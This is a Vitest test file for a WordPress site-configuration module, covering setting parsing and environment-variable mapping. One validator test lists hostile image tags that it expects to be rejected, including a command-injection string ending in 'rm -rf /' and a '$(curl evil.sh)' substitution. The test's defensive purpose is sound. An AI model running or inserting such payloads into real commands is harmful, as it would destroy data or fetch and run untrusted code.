import { describe, expect, it } from "vitest";

import {
	debugPatchToEnv,
	envBool,
	fastcgiCachePatchToEnv,
	imagePatchToEnv,
	isAllowedWordpressImage,
	parseScheduleStatus,
	securityFixToEnv,
	siteSecurityPatchToEnv,
} from "./site-config-pure";

describe("envBool", () => {
	it("treats 1/true/yes/on (any case) as true", () => {
		for (const v of ["1", "true", "TRUE", "yes", "On"]) {
			expect(envBool(v)).toBe(true);
		}
	});

	it("treats anything else (and nullish) as false", () => {
		for (const v of ["0", "false", "no", "off", "", "  "]) {
			expect(envBool(v)).toBe(false);
		}
		expect(envBool(null)).toBe(false);
		expect(envBool(undefined)).toBe(false);
	});
});

describe("parseScheduleStatus", () => {
	it("recovers cadence, monitor, debug flags, fastcgi cache, and www alias", () => {
		const out = [
			"backup_schedule\tweekly",
			"monitor\ton",
			"wp_debug_log\t1",
			"wp_debug_display\t0",
			"script_debug\t1",
			"fastcgi_cache\toff",
			"www_alias\ton",
			"disable_xmlrpc\t1",
			"disallow_file_edit\t0",
		].join("\n");
		expect(parseScheduleStatus(out)).toEqual({
			backupSchedule: "weekly",
			monitorEnabled: true,
			debugLog: true,
			debugDisplay: false,
			scriptDebug: true,
			fastcgiCache: false,
			wordpressImage: "",
			wwwAlias: true,
			disableXmlRpc: true,
			disallowFileEdit: false,
		});
	});

	it("reads the www alias as on only for an explicit on; off/absent disable it", () => {
		expect(parseScheduleStatus("www_alias\ton\n").wwwAlias).toBe(true);
		expect(parseScheduleStatus("www_alias\toff\n").wwwAlias).toBe(false);
		// Any unexpected token is treated as off (not configured).
		expect(parseScheduleStatus("www_alias\tbogus\n").wwwAlias).toBe(false);
		// Absent line -> default off.
		expect(parseScheduleStatus("backup_schedule\tdaily\n").wwwAlias).toBe(
			false
		);
	});

	it("defaults fastcgi cache to on (runtime default) when the line is absent", () => {
		expect(parseScheduleStatus("backup_schedule\tdaily\n").fastcgiCache).toBe(
			true
		);
		// An explicit `on` keeps it enabled; any unexpected token errs on enabled.
		expect(parseScheduleStatus("fastcgi_cache\ton\n").fastcgiCache).toBe(true);
		expect(parseScheduleStatus("fastcgi_cache\tbogus\n").fastcgiCache).toBe(
			true
		);
	});

	it("defaults to off / disabled for unknown or missing values", () => {
		expect(parseScheduleStatus("backup_schedule\tbogus\n")).toEqual({
			backupSchedule: "off",
			monitorEnabled: false,
			debugLog: false,
			debugDisplay: false,
			scriptDebug: false,
			fastcgiCache: true,
			wordpressImage: "",
			wwwAlias: false,
			disableXmlRpc: false,
			disallowFileEdit: false,
		});
		expect(parseScheduleStatus("")).toEqual({
			backupSchedule: "off",
			monitorEnabled: false,
			debugLog: false,
			debugDisplay: false,
			scriptDebug: false,
			fastcgiCache: true,
			wordpressImage: "",
			wwwAlias: false,
			disableXmlRpc: false,
			disallowFileEdit: false,
		});
	});
});

describe("debugPatchToEnv", () => {
	it("maps only supplied flags and names them in VIBE_SITE_CONFIG_KEYS", () => {
		expect(debugPatchToEnv({ debugLog: true })).toEqual({
			WP_DEBUG_LOG: "1",
			VIBE_SITE_CONFIG_KEYS: "WP_DEBUG_LOG",
		});
		expect(debugPatchToEnv({ debugDisplay: false, scriptDebug: true })).toEqual(
			{
				WP_DEBUG_DISPLAY: "0",
				SCRIPT_DEBUG: "1",
				VIBE_SITE_CONFIG_KEYS: "WP_DEBUG_DISPLAY SCRIPT_DEBUG",
			}
		);
	});

	it("returns an empty map (no key list) when nothing is supplied", () => {
		expect(debugPatchToEnv({})).toEqual({});
	});
});

describe("isAllowedWordpressImage", () => {
	it("accepts exactly the three curated tags", () => {
		for (const tag of [
			"wordpress:7.0-php8.5-fpm",
			"wordpress:7.0-php8.4-fpm",
			"wordpress:7.0-php8.3-fpm",
		]) {
			expect(isAllowedWordpressImage(tag)).toBe(true);
		}
	});

	it("rejects arbitrary strings, shell-meta, and a 4th tag", () => {
		for (const tag of [
			"",
			"wordpress:latest",
			"wordpress:7.0-php8.2-fpm",
			"wordpress:7.0-php9.0-fpm",
			"wordpress:7.0-php8.5-fpm; rm -rf /",
			"$(curl evil.sh)",
			"wordpress:7.0-php8.5-fpm ",
		]) {
			expect(isAllowedWordpressImage(tag)).toBe(false);
		}
	});
});

describe("imagePatchToEnv", () => {
	it("maps a tag to WORDPRESS_IMAGE and names it in VIBE_SITE_CONFIG_KEYS", () => {
		expect(imagePatchToEnv("wordpress:7.0-php8.4-fpm")).toEqual({
			WORDPRESS_IMAGE: "wordpress:7.0-php8.4-fpm",
			VIBE_SITE_CONFIG_KEYS: "WORDPRESS_IMAGE",
		});
	});
});

describe("fastcgiCachePatchToEnv", () => {
	it("maps true/false to on/off and names NGINX_FASTCGI_CACHE", () => {
		expect(fastcgiCachePatchToEnv(true)).toEqual({
			NGINX_FASTCGI_CACHE: "on",
			VIBE_SITE_CONFIG_KEYS: "NGINX_FASTCGI_CACHE",
		});
		expect(fastcgiCachePatchToEnv(false)).toEqual({
			NGINX_FASTCGI_CACHE: "off",
			VIBE_SITE_CONFIG_KEYS: "NGINX_FASTCGI_CACHE",
		});
	});
});

describe("securityFixToEnv", () => {
	it("maps disableXmlRpc to VIBE_WP_DISABLE_XMLRPC=1, naming only that key", () => {
		expect(securityFixToEnv("disableXmlRpc")).toEqual({
			VIBE_WP_DISABLE_XMLRPC: "1",
			VIBE_SITE_CONFIG_KEYS: "VIBE_WP_DISABLE_XMLRPC",
		});
	});

	it("maps disableFileEdit to DISALLOW_FILE_EDIT=1, naming only that key", () => {
		expect(securityFixToEnv("disableFileEdit")).toEqual({
			DISALLOW_FILE_EDIT: "1",
			VIBE_SITE_CONFIG_KEYS: "DISALLOW_FILE_EDIT",
		});
	});

	it("only ever sets the value to 1 (a security fix never loosens)", () => {
		for (const fix of ["disableXmlRpc", "disableFileEdit"] as const) {
			const env = securityFixToEnv(fix);
			const named = env.VIBE_SITE_CONFIG_KEYS;
			expect(env[named]).toBe("1");
		}
	});
});

describe("siteSecurityPatchToEnv", () => {
	it("maps reversible site guard settings to exact env keys", () => {
		expect(
			siteSecurityPatchToEnv({ disableXmlRpc: false, disallowFileEdit: true })
		).toEqual({
			VIBE_WP_DISABLE_XMLRPC: "0",
			DISALLOW_FILE_EDIT: "1",
			VIBE_SITE_CONFIG_KEYS: "VIBE_WP_DISABLE_XMLRPC DISALLOW_FILE_EDIT",
		});
	});

	it("returns an empty map when no settings are supplied", () => {
		expect(siteSecurityPatchToEnv({})).toEqual({});
	});
});
